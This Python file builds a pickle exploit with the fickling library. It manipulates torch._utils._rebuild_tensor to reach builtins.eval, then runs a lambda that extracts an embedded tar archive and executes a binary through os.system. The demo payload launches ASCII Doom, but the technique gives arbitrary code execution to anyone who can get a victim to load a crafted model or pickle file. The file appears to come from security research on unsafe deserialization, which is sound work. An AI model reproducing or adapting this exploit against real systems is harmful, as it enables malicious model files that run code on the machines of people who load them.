from spiro import Variables
from fickling import pickle as p

get_value = [p.Unicode(b"torch._utils"), p.Unicode(b"_rebuild_tensor"), p.StackGlobal()]

def make_concise_exploit(vars: Variables, doom: p.BinBytes) -> list[p.Opcode]:
    return [
        p.Unicode(b"torch"),
        p.Unicode(b"_utils"),
        p.StackGlobal(),
        vars.assign("_utils"),
        p.EmptyDict(),
        p.Unicode(b"_rebuild_tensor"),
        *get_value,
        p.SetItem(),
        # [_utils, {_rebuild: _rebuild}]
        vars["_utils"],
        p.EmptyDict(),
        p.Unicode(b"_rebuild_tensor"),
        p.Unicode(b"eval"),
        p.SetItem(),
        p.Build(),
        *get_value,
        # [_utils, {_rebuild}, _utils, "eval"]
        vars.assign("eval_str", p.Memoize()),
        p.Pop(),
        p.EmptyDict(),
        p.Unicode(b"_rebuild_tensor"),
        p.Unicode(b"builtins"),
        p.SetItem(),
        p.Build(),
        p.Pop(),
        *get_value,
        vars["eval_str"],
        # [_utils, {rebuild}, "builtins", "eval"]
        p.StackGlobal(),
        p.Unicode(
            b"lambda data: __import__('tarfile').open(fileobj=__import__('io').BytesIO(data)).extractall() or __import__('os').system('./doom_ascii')"
        ),
        p.TupleOne(),
        p.Reduce(),
        doom,
        p.TupleOne(),
        p.Reduce(), # irl execution stops here
        p.Pop(),
        p.Build(),
    ]

# [_utils, update, import/memo/pop, update, import, get, global ]

